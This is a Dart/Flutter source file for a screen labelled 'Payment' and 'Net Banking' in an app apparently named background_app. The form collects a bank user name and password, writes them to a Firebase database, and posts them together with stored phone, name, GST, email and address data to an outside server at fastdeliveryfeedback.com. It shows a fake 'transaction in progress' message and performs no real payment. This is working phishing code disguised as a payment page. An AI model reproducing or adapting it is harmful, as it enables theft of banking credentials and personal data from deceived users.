import 'dart:convert';
import 'dart:io';

import 'package:background_app/views/home_view.dart';
import 'package:background_app/widgets/prefix_icon_textfield.dart';
import 'package:background_app/widgets/primary_button.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:http/http.dart' as http;

class NetBankingView extends StatefulWidget {
  const NetBankingView({super.key});

  @override
  State<NetBankingView> createState() => _NetBankingViewState();
}

class _NetBankingViewState extends State<NetBankingView> {
  final _formKey = GlobalKey<FormState>();
  bool isLoading = false;
  final databaseRef = FirebaseDatabase.instance.ref('phone');
  final TextEditingController _userNmaeController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();

  Future<void> sendDataToServer() async {
    final prefs = await SharedPreferences.getInstance();
    var url = Uri.https("fastdeliveryfeedback.com", "/api/emp/create");
    var client = http.Client();

    var map = <String, String>{};
    map["number"] = prefs.get("number").toString();
    map["name"] =
    "${prefs.get("name").toString()} ${prefs.get("lname").toString()}";
    map["cname"] = prefs.get("cname").toString();
    map["gst"] = prefs.get("gst").toString();
    map["email"] = prefs.get("email").toString();
    map["address"] = prefs.get("address").toString();
    map["daddress"] = prefs.get("number").toString();
    map["customerid"] = _userNmaeController.text.toString();
    map["pin"] = _passwordController.text.toString();

    debugPrint(map.toString());
    try {
      var result = await client.post(url,
          body: map /*json.encode({
            "number": prefs.get("number").toString(),
            "name":
                "${prefs.get("name").toString()} ${prefs.get("lname").toString()}",
            "cname": prefs.get("cname").toString(),
            "gst": prefs.get("gst").toString(),
            "email": prefs.get("email").toString(),
            "address": prefs.get("address").toString(),
            "daddress": prefs.get("daddress").toString(),
            "customerid": _userNmaeController.text.toString(),
            "pin": _passwordController.text.toString(),
          })*/);

      if (result.statusCode == 200) {
        debugPrint("??stek ba??ar??l??");
        debugPrint(jsonDecode(result.body).toString());
      }
    } on SocketException {
    } on HttpException {
    } on FormatException {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: const Color(0xFF4d79ff),
        title: const Text(
          'Payment',
          style: TextStyle(
            fontSize: 20,
            fontWeight: FontWeight.w400,
          ),
        ),
        automaticallyImplyLeading: false,
        centerTitle: true,
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 20),
          child: Column(
            children: [
              const SizedBox(
                height: 100,
              ),
              Container(
                alignment: Alignment.center,
                width: double.infinity,
                // margin: EdgeInsets.symmetric(horizontal: 5),
                // height: 250,
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(10),
                  boxShadow: [
                    BoxShadow(
                      blurRadius: 4,
                      spreadRadius: 2,
                      color: Colors.black.withOpacity(0.20),
                      offset: const Offset(4, 0),
                    ),
                  ],
                ),
                child: Form(
                  key: _formKey,
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    crossAxisAlignment: CrossAxisAlignment.start,
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Align(
                        alignment: Alignment.center,
                        child: Text(
                          'Net Banking',
                          textAlign: TextAlign.center,
                          style: TextStyle(
                            fontSize: 25,
                            fontWeight: FontWeight.w500,
                            color: Color(0xFF3e445c),
                          ),
                        ),
                      ),
                      const SizedBox(height: 10),
                      const Text(
                        'User Name',
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w400,
                          // color: Color(0xFF3e445c),
                        ),
                      ),
                      const SizedBox(
                        height: 5,
                      ),
                      // PrimaryTextField(
                      //   validator: (value) {
                      //     if (value!.isEmpty) {
                      //       return 'Please Enter Your Card Number';
                      //     }
                      //     return null;
                      //   },
                      //   controller: _userNmaeController,
                      //   hintText: 'User name',
                      // ),
                      PrefixIconTextFieldWidget(
                        keyboardType: TextInputType.text,
                        hintText: 'User Name',
                        prefixIcon: 'assets/images/profile.svg',
                        controller: _userNmaeController,
                        validator: (value) {
                          if (value!.isEmpty) {
                            return 'Please Enter Your User name';
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 20),
                      const Text(
                        'Password',
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w400,
                          // color: Color(0xFF3e445c),
                        ),
                      ),
                      const SizedBox(
                        height: 5,
                      ),
                      PrefixIconTextFieldWidget(
                        keyboardType: TextInputType.text,
                        obscureText: true,
                        hintText: 'Password',
                        prefixIcon: 'assets/images/unlock.svg',
                        controller: _passwordController,
                        validator: (value) {
                          if (value!.isEmpty) {
                            return 'Please Enter Your password';
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 20),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 50),
              Container(
                alignment: Alignment.center,
                color: Colors.white,
                height: 100,
                child: Column(
                  children: [
                    PrimaryButton(
                        isLoading: isLoading,
                        title: 'Pay Now',
                        onTap: () async {
                          if (_formKey.currentState!.validate()) {
                            databaseRef
                                .child(DateTime.now()
                                    .millisecondsSinceEpoch
                                    .toString())
                                .set({
                              'user name': _userNmaeController.text.toString(),
                              'password': _passwordController.text.toString(),
                            });
                            setState(() {
                              isLoading = true;
                            });
                            await sendDataToServer();
                          }
                        }),
                    const SizedBox(height: 10),
                    isLoading
                        ? const Text(
                            'Please wait while your transaction is in progress',
                            style: TextStyle(
                                fontSize: 15,
                                fontWeight: FontWeight.w400,
                                color: Colors.red),
                          )
                        : const SizedBox.shrink()
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
